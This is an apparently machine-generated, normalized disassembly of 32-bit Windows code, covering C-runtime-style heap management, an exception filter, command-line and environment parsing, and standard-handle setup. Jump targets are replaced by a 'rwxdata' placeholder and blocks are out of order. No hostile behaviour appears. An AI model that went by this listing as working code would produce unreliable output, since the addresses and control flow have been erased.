lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne rwxdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp rwxdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne rwxdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne rwxdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp rwxdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae rwxdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp rwxdata
cmp [ ebp + 0x13 ] 0x0
jne rwxdata
cmp [ ebp + 0x13 ] 0x0
jne rwxdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp rwxdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_408651
cmp [ rwxdata ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne rwxdata
push 0x2020
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je rwxdata
mov esi rwxdata
jmp rwxdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je rwxdata
cmp esi rwxdata
je rwxdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je rwxdata
push esi
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rwxdata
cmp esi eax
jne rwxdata
mov [ esi ] eax
mov eax [ rwxdata ]
mov [ esi + 0x4 ] eax
mov [ rwxdata ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rwxdata ] 0x0
jne rwxdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl rwxdata
push ebx
push 0x0
push edi
call sub_406f90
add esp 0xc
cmp [ rwxdata ] 0x0
jne rwxdata
mov [ rwxdata ] eax
mov eax esi
jmp rwxdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp rwxdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rwxdata ] eax
jmp rwxdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae rwxdata
sub_408795
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rwxdata ] esi
jne rwxdata
cmp esi rwxdata
je rwxdata
mov eax [ esi + 0x4 ]
mov [ rwxdata ] eax
or [ rwxdata ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rwxdata ]
call [ HeapFree@IAT ]
pop esi
retn
sub_4087eb
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rwxdata ]
push edi
cmp esi [ rwxdata ]
je rwxdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg rwxdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge rwxdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je rwxdata
cmp [ esi + 0x10 ] 0xffffffff
je rwxdata
cmp [ edi ] 0xf0
jne rwxdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je rwxdata
or [ edi ] 0xffffffff
dec [ rwxdata ]
mov eax [ esi + 0xc ]
test eax eax
je rwxdata
cmp [ ecx + 0x18 ] 0xffffffff
jne rwxdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe rwxdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je rwxdata
cmp edx 0x400
jne rwxdata
inc edx
add eax 0x8
cmp edx 0x400
jl rwxdata
push ecx
call sub_408795
pop ecx
cmp [ eax ] 0xffffffff
jne rwxdata
sub_4088ad
mov eax [ esp + 0x4 ]
mov edx rwxdata
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je rwxdata
cmp eax [ ecx + 0x14 ]
jb rwxdata
xor eax eax
pop esi
retn
jmp rwxdata
test al 0xf
jne rwxdata
cmp eax [ ecx + 0x10 ]
jbe rwxdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb rwxdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_408904
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne rwxdata
retn
inc [ rwxdata ]
cmp [ rwxdata ] 0x20
jne rwxdata
push 0x10
call sub_4087eb
pop ecx
sub_408949
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rwxdata ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae rwxdata
mov eax rwxdata
mov edi eax
jmp rwxdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl rwxdata
mov edi [ edi ]
cmp edi eax
je rwxdata
cmp [ edi + 0xc ] 0x0
jne rwxdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je rwxdata
mov esi [ esi ]
cmp esi [ rwxdata ]
je rwxdata
mov eax [ edi ]
cmp eax ebx
jl rwxdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb rwxdata
cmp [ edi + 0x4 ] ebx
jbe rwxdata
call sub_408651
test eax eax
je rwxdata
jmp rwxdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne rwxdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb rwxdata
cmp [ edi + 0x4 ] ebx
jbe rwxdata
jmp rwxdata
push ebx
push ecx
push eax
call sub_408b51
add esp 0xc
test eax eax
jne rwxdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rwxdata ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp rwxdata
cmp [ edi + 0x10 ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne rwxdata
cmp [ ebp - 0x4 ] 0x10
jge rwxdata
jmp rwxdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_408b51
add esp 0xc
test eax eax
jne rwxdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae rwxdata
mov [ rwxdata ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp rwxdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_406f90
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle rwxdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je rwxdata
mov [ edi + 0x4 ] ebx
mov [ rwxdata ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp rwxdata
cmp [ ecx ] 0xffffffff
je rwxdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne rwxdata
cmp ecx eax
add ecx 0x8
jmp rwxdata
cmp ecx eax
jae rwxdata
sub_408b51
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb rwxdata
add esi edi
cmp [ esi ] 0x0
je rwxdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae rwxdata
lea esi [ eax + edx ]
cmp esi ebx
jae rwxdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp rwxdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne rwxdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp rwxdata
lea eax [ edi + 0x8 ]
jmp rwxdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae rwxdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne rwxdata
cmp esi edx
jae rwxdata
inc ebx
inc esi
jmp rwxdata
movzx eax al
add esi eax
jmp rwxdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae rwxdata
cmp eax [ ebp - 0x4 ]
jne rwxdata
cmp [ ebx ] 0x0
jne rwxdata
cmp esi edi
jae rwxdata
cmp eax edx
jae rwxdata
inc ebx
inc eax
jmp rwxdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp rwxdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb rwxdata
mov [ ecx + 0x4 ] esi
jmp rwxdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae rwxdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb rwxdata
cmp [ ebx ] 0x0
jne rwxdata
mov [ eax ] dl
add eax 0x8
jmp rwxdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp rwxdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp rwxdata
mov esi ebx
jmp rwxdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb rwxdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_408c75
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe rwxdata
jae rwxdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp rwxdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja rwxdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne rwxdata
cmp [ eax ] 0x0
jne rwxdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja rwxdata
cmp eax esi
inc eax
jmp rwxdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe rwxdata
cmp eax esi
jae rwxdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae rwxdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne rwxdata
mov [ ebx + 0x4 ] eax
jmp rwxdata
inc eax
cmp [ esi + eax ] 0x0
je rwxdata
sub_408d1e
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_408e5f
test eax eax
pop ecx
je rwxdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je rwxdata
cmp ebx 0x5
jne rwxdata
cmp ebx 0x1
je rwxdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
mov ecx [ rwxdata ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne rwxdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add edx ecx
push esi
cmp ecx edx
jge rwxdata
mov eax [ eax ]
mov esi [ rwxdata ]
cmp eax 0xc000008e
jne rwxdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rwxdata ]
cmp eax 0xc0000090
jne rwxdata
mov [ rwxdata ] 0x83
jmp rwxdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne rwxdata
cmp eax 0xc0000091
jne rwxdata
mov [ rwxdata ] 0x81
jmp rwxdata
push [ rwxdata ]
push 0x8
call ebx
pop ecx
mov [ rwxdata ] esi
pop ecx
pop esi
jmp rwxdata
cmp eax 0xc0000093
jne rwxdata
mov [ rwxdata ] 0x84
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
cmp eax 0xc000008d
jne rwxdata
mov [ rwxdata ] 0x85
jmp rwxdata
cmp eax 0xc000008f
jne rwxdata
mov [ rwxdata ] 0x82
jmp rwxdata
cmp eax 0xc0000092
jne rwxdata
mov [ rwxdata ] 0x86
jmp rwxdata
mov [ rwxdata ] 0x8a
sub_408e5f
mov edx [ esp + 0x4 ]
mov ecx [ rwxdata ]
cmp [ rwxdata ] edx
push esi
mov eax rwxdata
je rwxdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rwxdata ]
cmp eax ecx
jae rwxdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rwxdata ]
xor eax eax
cmp [ eax ] edx
je rwxdata
cmp [ eax ] edx
jne rwxdata
retn
add eax 0xc
cmp eax esi
jae rwxdata
sub_408ea2
cmp [ rwxdata ] 0x0
jne rwxdata
push esi
mov esi [ rwxdata ]
mov al [ esi ]
cmp al 0x22
jne rwxdata
call sub_40ab16
cmp al 0x20
jbe rwxdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je rwxdata
mov al [ esi ]
test al al
je rwxdata
inc esi
cmp [ esi ] 0x20
ja rwxdata
cmp [ esi ] 0x22
jne rwxdata
test al al
je rwxdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe rwxdata
inc esi
jmp rwxdata
movzx eax al
push eax
call sub_40a710
test eax eax
pop ecx
je rwxdata
inc esi
jmp rwxdata
sub_408efa
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov esi [ rwxdata ]
xor edi edi
call sub_40ab16
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4068cc
mov esi eax
pop ecx
cmp esi ebx
mov [ rwxdata ] esi
jne rwxdata
cmp al 0x3d
je rwxdata
mov edi [ rwxdata ]
cmp [ edi ] bl
je rwxdata
push 0x9
call sub_4063f4
pop ecx
push esi
call sub_406440
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp rwxdata
inc edi
push [ rwxdata ]
call sub_406295
pop ecx
mov [ rwxdata ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rwxdata ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je rwxdata
add edi ebp
cmp [ edi ] bl
jne rwxdata
push ebp
call sub_4068cc
cmp eax ebx
pop ecx
mov [ esi ] eax
jne rwxdata
push edi
call sub_406440
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je rwxdata
pop ebp
push edi
push [ esi ]
call sub_407760
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_4063f4
pop ecx
sub_408fb3
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov esi rwxdata
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rwxdata ]
mov [ rwxdata ] esi
mov edi esi
cmp [ eax ] bl
je rwxdata
call sub_40ab16
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40904c
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_4068cc
mov esi eax
add esp 0x18
cmp esi ebx
jne rwxdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40904c
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rwxdata ] esi
pop edi
pop esi
mov [ rwxdata ] eax
pop ebx
leave
retn
push 0x8
call sub_4063f4
pop ecx
sub_40904c
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je rwxdata
cmp [ eax ] 0x22
jne rwxdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je rwxdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je rwxdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rwxdata ] 0x4
je rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je rwxdata
test dl dl
je rwxdata
cmp dl 0x20
je rwxdata
inc [ ecx ]
test esi esi
je rwxdata
cmp [ eax ] 0x22
jne rwxdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rwxdata ] 0x4
je rwxdata
test dl dl
jne rwxdata
test dl dl
je rwxdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp rwxdata
inc [ ecx ]
test esi esi
je rwxdata
inc [ ecx ]
test esi esi
je rwxdata
test esi esi
je rwxdata
dec eax
jmp rwxdata
cmp dl 0x9
jne rwxdata
test edi edi
je rwxdata
mov dl [ eax ]
cmp dl 0x20
je rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp rwxdata
cmp dl 0x9
jne rwxdata
cmp [ eax ] 0x0
je rwxdata
test edi edi
je rwxdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne rwxdata
inc eax
inc ebx
jmp rwxdata
mov edx ebx
dec ebx
test edx edx
je rwxdata
test bl 0x1
jne rwxdata
cmp [ eax ] 0x5c
jne rwxdata
mov dl [ eax ]
test dl dl
je rwxdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je rwxdata
test esi esi
je rwxdata
cmp [ ebp + 0x18 ] 0x0
jne rwxdata
inc [ ecx ]
dec ebx
jne rwxdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne rwxdata
inc [ ecx ]
jmp rwxdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je rwxdata
cmp dl 0x20
je rwxdata
test esi esi
je rwxdata
mov eax edx
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
inc eax
jmp rwxdata
test esi esi
je rwxdata
cmp dl 0x9
je rwxdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rwxdata ] 0x4
je rwxdata
movzx ebx dl
test [ ebx + rwxdata ] 0x4
je rwxdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp rwxdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_409200
push ecx
push ecx
mov eax [ rwxdata ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne rwxdata
cmp eax 0x1
jne rwxdata
call ebp
mov esi eax
cmp esi ebx
je rwxdata
cmp eax 0x2
jne rwxdata
cmp esi ebx
jne rwxdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
mov [ rwxdata ] 0x1
jmp rwxdata
xor eax eax
cmp edi ebx
jne rwxdata
cmp [ esi ] bx
mov eax esi
je rwxdata
call ebp
mov esi eax
cmp esi ebx
je rwxdata
mov [ rwxdata ] 0x2
jmp rwxdata
cmp [ edi ] bl
mov eax edi
je rwxdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je rwxdata
inc eax
inc eax
cmp [ eax ] bx
jne rwxdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_4068cc
mov esi eax
pop ecx
cmp esi ebx
jne rwxdata
inc eax
cmp [ eax ] bl
jne rwxdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp rwxdata
push ebp
call sub_4068cc
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je rwxdata
inc eax
inc eax
cmp [ eax ] bx
jne rwxdata
push ebp
push edi
push esi
call sub_4064e0
add esp 0xc
xor esi esi
jmp rwxdata
inc eax
cmp [ eax ] bl
jne rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne rwxdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp rwxdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_406295
pop ecx
mov [ esp + 0x10 ] ebx
sub_409332
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_4068cc
mov esi eax
pop ecx
test esi esi
jne rwxdata
mov [ rwxdata ] esi
mov [ rwxdata ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_4063f4
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je rwxdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rwxdata ]
add esi 0x8
add eax 0x100
jmp rwxdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je rwxdata
cmp esi eax
jae rwxdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne rwxdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl rwxdata
mov eax [ rwxdata ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne rwxdata
push [ rwxdata ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp rwxdata
cmp [ rwxdata ] esi
jge rwxdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp rwxdata
push edi
call [ GetFileType@IAT ]
test eax eax
je rwxdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je rwxdata
xor edi edi
test esi esi
jle rwxdata
mov edi rwxdata
inc ebx
cmp ebx 0x3
jl rwxdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne rwxdata
mov eax [ ebx ]
cmp eax 0xffffffff
je rwxdata
mov esi [ rwxdata ]
add [ rwxdata ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne rwxdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl rwxdata
mov cl [ ebp ]
test cl 0x1
je rwxdata
